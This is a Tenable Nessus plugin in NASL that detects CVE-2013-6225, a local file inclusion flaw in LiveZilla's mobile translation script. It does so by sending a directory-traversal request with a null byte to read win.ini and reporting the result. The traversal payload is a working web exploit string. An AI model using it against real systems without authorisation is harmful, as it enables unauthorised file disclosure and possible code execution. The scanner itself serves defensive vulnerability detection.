#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(71440);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2016/05/20 14:03:01 $");

  script_cve_id("CVE-2013-6225");
  script_bugtraq_id(63764);
  script_osvdb_id(99991);
  script_xref(name:"EDB-ID", value:"29672");

  script_name(english:"LiveZilla 'mobile/php/translation/index.php' 'g_language' Parameter Local File Inclusion");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file inclusion attack.");
  script_set_attribute(attribute:"description", value:
"The version of LiveZilla installed on the remote web server fails to
properly sanitize user-supplied input to the 'g_language' parameter of
the 'mobile/php/translation/index.php' script. A remote,
unauthenticated attacker can exploit this issue to view arbitrary
files or execute arbitrary PHP code on the remote host.

Note that this application is reportedly also affected by several
additional vulnerabilities including a local password disclosure and
multiple cross-site scripting vulnerabilities; however, Nessus has not
tested for them.");
  script_set_attribute(attribute:"see_also", value:"http://blog.curesec.com/article/blog/25.html");
  script_set_attribute(attribute:"see_also", value:"http://www.livezilla.net/board/index.php?/topic/163-livezilla-changelog/");
  script_set_attribute(attribute:"solution", value:"Upgrade to LiveZilla version 5.1.1.0 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/11/15");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/11/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/12/14");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:livezilla:livezilla");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("livezilla_detect.nbin", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/LiveZilla", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

port = get_http_port(default:80, php:TRUE);

appname = 'LiveZilla';

install = get_single_install(app_name:appname, port:port, exit_if_unknown_ver:TRUE);
path = install["path"];
install_url = build_url(port:port, qs:path);

# Make sure we have a Windows host as this only affects installs on Windows
if (report_paranoia < 2)
{
  os = get_kb_item("Host/OS");
  if (os && "Windows" >!< os) audit(AUDIT_OS_NOT, 'Windows');
}

files = make_list('windows/win.ini', 'winnt/win.ini');

file_pats = make_array();
file_pats['winnt/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";
file_pats['windows/win.ini'] = "^\[[a-zA-Z]+\]|^; for 16-bit app support";

vuln = FALSE;

foreach file (files)
{
  attack = mult_str(str:"../", nb:12) + file + "%00";
  url = "/mobile/php/translation/index.php?g_language=" + attack;

  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : path + url,
    exit_on_fail : TRUE
  );
  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    vuln = TRUE;
    break;
  }
}

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, install_url);

if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report =
    '\n' + 'Nessus was able to exploit the issue to retrieve the contents'+
     '\n' + 'of "'+file+'" using the following request :' +
     '\n' +
     '\n' + install_url + url +
     '\n';
  if (report_verbosity > 1)
  {
    if (
      !defined_func("nasl_level") ||
      nasl_level() < 5200 ||
      !isnull(get_preference("sc_version"))
    )
    {
      report +=
        '\n' + 'This produced the following truncated output :' +
        '\n' + snip +
        '\n' + beginning_of_response(resp:res[2], max_lines:'10') +
        '\n' + snip +
        '\n';
      security_hole(port:port, extra:report);
    }
    else
    {
      # Sanitize file names
      if ("/" >< file)file = ereg_replace(pattern:"^.+/([^/]+)$", replace:"\1", string:file);

      security_report_v4(
        port        : port,
        severity    : SECURITY_HOLE,
        file        : file,
        line_limit  : 10,
        request     : make_list(url),
        output      : chomp(res[2]),
        attach_type : 'text/plain'
      );

    }
  }
  else security_hole(port:port, extra:report);
}
else security_hole(port);
